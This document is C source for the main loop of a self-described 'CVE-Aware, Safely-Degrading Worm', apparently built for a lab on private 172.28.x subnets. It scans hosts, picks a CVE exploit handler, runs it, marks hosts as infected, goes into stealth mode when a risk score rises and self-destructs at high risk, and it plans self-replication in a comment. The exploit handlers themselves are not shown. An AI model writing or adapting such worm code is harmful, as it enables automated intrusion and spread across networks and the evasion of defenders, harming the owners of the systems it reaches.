#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "risk_assessment.h"
#include "handler_registry.h"
#include "decision_engine.h"
#include "state_manager.h"
#include "degradation.h"
#include "utils.h"

// Configuration
#define MAX_SUBNETS 4
#define MAX_IP_LEN 16
#define REMOTE_WORM_PATH "/tmp/worm"

// Subnets to scan
const char* SUBNETS[MAX_SUBNETS] = {
    "172.28.1",
    "172.28.2",
    "172.28.3",
    "172.28.4"
};

// Phase 1: Scan
static cve_result_vector_t phase1_scan(const char* target_ip) {
    return scan_all_handlers(target_ip);
}

// Phase 2: Decision
static decision_result_t phase2_decision(cve_result_vector_t* scan_results, 
                                         risk_assessment_t* risk) {
    degradation_mode_t mode = MODE_NORMAL;  // Can be set based on risk
    if (risk->total_risk >= 4 && risk->total_risk < 7) {
        mode = MODE_STEALTH;
    }
    
    return make_decision(scan_results, risk, mode);
}

// Phase 3: Execute
static int phase3_execute(int cve_id, const char* target_ip, const char* argv0) {
    (void)argv0;  // Suppress unused parameter warning (reserved for future self-replication)
    
    cve_handler_config_t* handler = get_handler(cve_id);
    if (!handler) {
        printf("[-] Handler not found for CVE ID %d\n", cve_id);
        return 0;
    }
    
    printf("[*] Executing CVE ID %d on %s...\n", cve_id, target_ip);
    
    // Execute execution handler
    int execution_success = call_execution_handler(handler, target_ip);
    
    if (execution_success) {
        printf("[+] Execution successful on %s\n", target_ip);
        
        // TODO: Self-replication
        // For now, self-replication is handled by execution scripts
        // In the future, we can add:
        // self_replicate(target_ip, argv0, REMOTE_WORM_PATH, execute_cmd_func);
        
        update_successful_operation();
        return 1;
    } else {
        printf("[-] Execution failed on %s\n", target_ip);
        update_failed_operation();
        return 0;
    }
}

int main(int argc, char* argv[]) {
    (void)argc;  // Suppress unused parameter warning
    
    printf("=== CVE-Aware, Safely-Degrading Worm ===\n");
    
    // Initialize modules
    init_handler_registry();
    init_decision_rules();
    init_state();
    
    // Delay to allow system to settle if just started
    sleep(2);
    
    // Main loop with 4-phase engine
    while (1) {
        printf("\n[*] Starting infection round...\n");
        
        // Phase 0: Risk Assessment
        risk_assessment_t risk = assess_risk();
        printf("[*] Risk Assessment: Total=%d (Network=%d, System=%d, Behavioral=%d)\n",
               risk.total_risk, risk.network_risk, risk.system_risk, risk.behavioral_risk);
        
        if (risk.total_risk >= 7) {
            self_destruct();
            break;
        }
        
        if (risk.total_risk >= 4) {
            enter_stealth_mode();
            continue;  // Loop back to risk assessment
        }
        
        // Iterate targets
        for (int i = 0; i < MAX_SUBNETS; i++) {
            for (int host = 2; host < 4; host++) {
                char ip[MAX_IP_LEN];
                snprintf(ip, sizeof(ip), "%s.%d", SUBNETS[i], host);
                
                // Skip if already infected
                if (is_infected(ip)) {
                    printf("[*] %s already infected, skipping\n", ip);
                    continue;
                }
                
                // Phase 1: Scan
                printf("[*] Scanning %s...\n", ip);
                cve_result_vector_t scan_results = phase1_scan(ip);
                printf("[*] Scan complete: %d CVEs checked\n", scan_results.count);
                
                // Phase 2: Decision
                decision_result_t decision = phase2_decision(&scan_results, &risk);
                
                if (!decision.should_execute) {
                    printf("[*] No suitable CVE found for %s\n", ip);
                    continue;
                }
                
                printf("[*] Selected CVE ID %d for %s\n", decision.selected_cve_id, ip);
                
                // Phase 3: Execute
                if (phase3_execute(decision.selected_cve_id, ip, argv[0])) {
                    mark_infected(ip);
                    printf("[+] Successfully infected %s\n", ip);
                } else {
                    update_failed_connection();
                }
            }
        }
        
        printf("[*] Round complete. Sleeping 20 seconds...\n");
        sleep(20);
    }
    
    return 0;
}

